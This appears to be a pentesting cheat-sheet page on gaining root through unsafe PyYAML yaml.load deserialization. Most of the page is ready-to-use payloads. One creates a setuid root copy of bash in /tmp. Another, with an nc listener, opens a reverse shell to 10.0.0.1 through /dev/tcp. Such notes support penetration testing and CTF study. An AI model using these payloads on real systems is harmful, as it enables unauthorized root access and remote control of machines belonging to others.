---
title: Python Yaml Privilege Escalation
description: Python Yaml package is vulnerable to execute arbitrary command.
tags:
    - Privilege Escalation
refs:
    - https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation
date: 2023-02-28
draft: false
---

## Investigation

```python
import yaml

filename = "example.yml"
yaml.load()
```

<br />

## Payloads

### Bash Privileged Mode

```python
import yaml
yaml.load('!!python/object/new:os.system ["cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u+sx /tmp/bash"]')
```

Now execute the **`bash`** in privilege mode.

```bash
/tmp/bash -p
```

### Reverse Shell

Start a listener in local machine.

```bash
nc -lvnp 1234
```

Then execute Python script that contains the following `YAML` code as root.

```python
import yaml
yaml.load('!!python/object/new:os.system ['bash -c "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1"'])
```

We should get a root shell.